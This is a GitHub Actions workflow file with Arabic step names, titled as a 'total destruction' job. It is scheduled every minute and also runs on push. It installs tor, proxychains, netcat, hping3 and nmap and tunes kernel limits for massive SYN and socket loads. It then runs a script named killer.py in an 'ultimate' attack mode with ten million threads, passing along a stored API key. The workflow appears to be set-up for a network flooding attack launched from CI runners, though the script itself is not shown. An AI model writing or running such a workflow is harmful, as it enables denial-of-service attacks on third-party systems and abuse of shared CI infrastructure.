name: PHOENIX-OMEGA - تدمير شامل
on:
  schedule:
    - cron: '*/1 * * * *'  # كل دقيقة
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  destroy:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.9, 3.10, 3.11]
    
    steps:
      - uses: actions/checkout@v4
      
      - name: إعداد Python
        uses: actions/setup-python@v4
        with:
          python-version: ${{ matrix.python-version }}
      
      - name: تثبيت المتطلبات
        run: |
          pip install --upgrade pip
          pip install -r requirements.txt
          sudo apt-get update
          sudo apt-get install -y tor proxychains netcat-openbsd hping3 nmap
      
      - name: تكوين النظام
        run: |
          sudo sysctl -w net.ipv4.ip_forward=1
          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=1048576
          sudo sysctl -w net.core.rmem_max=536870912
          sudo sysctl -w net.core.wmem_max=536870912
          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
          sudo sysctl -w net.ipv4.tcp_tw_recycle=1
          sudo sysctl -w net.core.netdev_max_backlog=1048576
          ulimit -n 1048576
      
      - name: تشغيل الهجوم النهائي
        env:
          GEMINI_KEY: ${{ secrets.GEMINI_KEY }}
        run: |
          python src/core/killer.py --mode ultimate --threads 10000000
